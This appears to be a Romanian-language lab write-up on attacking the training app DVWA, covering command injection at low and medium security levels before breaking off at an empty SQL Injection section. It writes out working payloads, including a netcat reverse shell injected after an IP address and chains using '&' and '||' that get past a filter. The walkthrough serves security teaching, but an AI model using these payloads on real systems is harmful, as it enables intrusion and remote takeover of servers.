### Atac HTTP:
  - [Despre HTTP / HTTPS](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_http_https.md)
  - In scop didactic, am folosit **DVWA** (Damn Vulnerable Web App). Pentru instalare si informatii aditionale: [link](https://github.com/digininja/DVWA).
  - Cuprins:
    - Command Execution
    - CSRF
    - File Inclusion
    - SQL Injection
    - SQL Injection(Blind)
    - Upload
    - XSS reflected
    - XSS stored  
 
## **Command Execution**
   - [Despre Command Injection](https://github.com/Dani780-C/Cyber-security/blob/main/learn/command_injection.md)
   - **Not hacked:** *introducem orice adresa IP (ex: 192.168.56.101)*  
   
     Raspuns:  
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_execution_normal.png)  
     Captura trafic: [download](https://github.com/Dani780-C/Cyber-security/blob/main/captures/dvwa_command_execution_low_nothacked.pcapng)  
   - **Hacked:**  
   
     **LOW**  
        - Sursa codului PHP:  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/source_code_low_command_execution.png)  
        
        Pentru ca nu avem niciun fel de validare pe input-ul form-ului, putem scrie orice adresa IP urmat de `;` sau `&&`.  
        De exemplu, executia unui reverse shell: intr-un terminal separat se va executa un listener `nc -lvp 4444`, iar in form-ul aplicatiei se va introduce `192.168.56.101; nc -e /bin/bash 192.168.56.101 4444`  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_reverse_shell.png)  
        
        Captura trafic: [download](https://github.com/Dani780-C/Cyber-security/blob/main/captures/dvwa_command_injection_reverse_shell.pcapng)  
       
     **MEDIUM**  
        - Sursa codului PHP:  
         
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_source_code_medium.png)  
        
        Codul PHP respectiv va inspecta string-ul primit din form si va scoate `;` si `&&`. Daca vom scrie `192.168.56.101; ls` nu se va executa comanda. Daca vom scrie `&` vom pune comanda `ping <adresa IP>` in background si astfel se va rula si urmatoarea comanda inlantuita in string-ul input-ului. De exemplu, vom introduce `192.168.56.101 & hostname & ls & pwd`. De asemenea, putem scrie `<orice string, dar nu o adresa IP valida> || ls`.  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_medium_1.png)  
        
        ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/dvwa_command_injection_2.png)  
        
## **SQL Injection**
  - [Despre SQL Injection](https://github.com/Dani780-C/Cyber-security/blob/main/learn/sql_injection.md)  
